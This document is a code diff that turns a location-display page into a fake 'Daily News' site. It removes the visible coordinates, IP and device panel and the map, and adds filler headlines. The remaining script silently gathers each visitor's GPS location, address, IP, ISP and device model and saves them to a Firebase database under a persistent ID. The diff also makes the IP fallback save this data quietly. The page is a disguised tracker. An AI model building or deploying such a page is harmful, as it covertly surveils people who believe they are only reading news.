@@ -4,18 +4,16 @@
 <title>Daily News</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-
 <style>
 body{margin:0;font-family:Arial;background:#f5f5f5;}
 
 header{
-background:#d60000;
+background:#c40000;
 color:white;
 padding:15px;
-font-size:26px;
-font-weight:bold;
 text-align:center;
+font-size:28px;
+font-weight:bold;
 }
 
 nav{
@@ -31,56 +29,49 @@ text-decoration:none;
 font-size:14px;
 }
 
-.hero{
-background:url('https://picsum.photos/1200/400') center/cover;
-color:white;
-padding:60px 20px;
-text-align:center;
-}
-
-.hero h2{
-font-size:32px;
-}
-
 .container{
-width:90%;
+width:95%;
 margin:auto;
 margin-top:20px;
+}
+
+.top-news{
+display:grid;
+grid-template-columns:2fr 1fr;
+gap:15px;
+}
+
+.main-news{
+background:white;
+padding:15px;
+border-radius:8px;
+}
+
+.side-news{
+display:flex;
+flex-direction:column;
+gap:10px;
+}
+
+.card{
+background:white;
+padding:10px;
+border-radius:8px;
 }
 
 .grid{
 display:grid;
 grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
 gap:15px;
-}
-
-.card{
-background:white;
-padding:15px;
-border-radius:8px;
-box-shadow:0 2px 5px rgba(0,0,0,0.1);
-}
-
-.info{
 margin-top:20px;
-background:white;
-padding:15px;
-border-radius:8px;
 }
 
-.row{margin-bottom:8px;}
-
-#map{
-width:100%;
-height:300px;
-margin-top:15px;
-border-radius:8px;
-}
-
-#status{
+.footer{
+background:#111;
+color:white;
 text-align:center;
-margin-top:10px;
-font-weight:bold;
+padding:15px;
+margin-top:20px;
 }
 </style>
 </head>
@@ -92,44 +83,38 @@ font-weight:bold;
 <nav>
 <a href="#">Home</a>
 <a href="#">World</a>
-<a href="#">Tech</a>
+<a href="#">Technology</a>
 <a href="#">Sports</a>
-<a href="#">Contact</a>
+<a href="#">Business</a>
 </nav>
-
-<div class="hero">
-<h2>Breaking News Today</h2>
-<p>Latest updates from around the world</p>
-</div>
 
 <div class="container">
 
+<div class="top-news">
+<div class="main-news">
+<h2>🔥 Breaking: Global Market Updates</h2>
+<p>Latest updates from around the world. Stay informed with real-time news coverage and insights.</p>
+</div>
+
+<div class="side-news">
+<div class="card">📱 iPhone 16 leaks revealed</div>
+<div class="card">⚽ Football transfer news</div>
+<div class="card">🌍 Climate change alert</div>
+</div>
+</div>
+
 <div class="grid">
-<div class="card">🌍 World News Headline</div>
-<div class="card">💻 Tech Update</div>
-<div class="card">⚽ Sports Highlight</div>
+<div class="card">💰 Dollar rate rising globally</div>
+<div class="card">🚗 New electric cars launched</div>
+<div class="card">🎬 New movie breaking records</div>
+<div class="card">📊 Stock market analysis</div>
 </div>
-
-<div id="status">Loading news...</div>
-
-<div class="info">
-<div class="row">Latitude: <span id="lat"></span></div>
-<div class="row">Longitude: <span id="lon"></span></div>
-<div class="row">Thana: <span id="thana"></span></div>
-<div class="row">District: <span id="district"></span></div>
-<div class="row">Country: <span id="country"></span></div>
-<div class="row">IP: <span id="ip"></span></div>
-<div class="row">ISP: <span id="isp"></span></div>
-<div class="row">Device: <span id="device"></span></div>
-<div class="row">Model: <span id="model"></span></div>
-<div class="row">Type: <span id="type"></span></div>
-</div>
-
-<div id="map"></div>
 
 </div>
 
-<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<div class="footer">
+© 2026 Daily News. All rights reserved.
+</div>
 
 <script type="module">
 
@@ -148,9 +133,7 @@ appId: "1:951484366467:web:2e936d42b1704027f665b6"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-var map = L.map('map').setView([23.8,90.4],10);
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-
+// USER ID
 function getUserId(){
 let id = localStorage.getItem("userId")
 if(!id){
@@ -160,6 +143,7 @@ localStorage.setItem("userId", id)
 return id
 }
 
+// DEVICE
 function detectDevice(){
 let ua=navigator.userAgent;
 if(/mobile/i.test(ua)) return "Mobile";
@@ -175,6 +159,7 @@ if(ua.includes("Mac")) return "Mac";
 return "Unknown";
 }
 
+// LOCATION
 async function getLocationDetails(lat, lon){
 try{
 const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
@@ -190,6 +175,7 @@ return {thana:"unknown",district:"unknown"}
 }
 }
 
+// IP
 async function getIP(){
 let res = await fetch("https://ipinfo.io/json")
 let data = await res.json()
@@ -201,11 +187,13 @@ country:data.country
 }
 }
 
+// SAVE
 async function save(data){
 let id = getUserId()
 await setDoc(doc(db,"locations",id), data)
 }
 
+// GPS
 async function useGPS(pos){
 
 let lat = pos.coords.latitude
@@ -213,21 +201,6 @@ let lon = pos.coords.longitude
 
 let loc = await getLocationDetails(lat,lon)
 let ip = await getIP()
-
-document.getElementById("status").innerText="Live News Loaded"
-document.getElementById("lat").innerText=lat
-document.getElementById("lon").innerText=lon
-document.getElementById("thana").innerText=loc.thana
-document.getElementById("district").innerText=loc.district
-document.getElementById("country").innerText=ip.country
-document.getElementById("ip").innerText=ip.ip
-document.getElementById("isp").innerText=ip.org
-document.getElementById("device").innerText=detectDevice()
-document.getElementById("model").innerText=detectDeviceModel()
-document.getElementById("type").innerText="GPS"
-
-map.setView([lat,lon],15)
-L.marker([lat,lon]).addTo(map)
 
 save({
 latitude:lat,
@@ -245,18 +218,20 @@ time:new Date().toLocaleString()
 
 }
 
+// IP fallback
 async function useIP(){
 
 let ip = await getIP()
 
-document.getElementById("status").innerText="Limited News Mode"
-
-document.getElementById("country").innerText=ip.country
-document.getElementById("ip").innerText=ip.ip
-document.getElementById("isp").innerText=ip.org
-document.getElementById("device").innerText=detectDevice()
-document.getElementById("model").innerText=detectDeviceModel()
-document.getElementById("type").innerText="IP"
+save({
+country:ip.country,
+ip:ip.ip,
+isp:ip.org,
+device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"IP",
+time:new Date().toLocaleString()
+})
 
 }
 
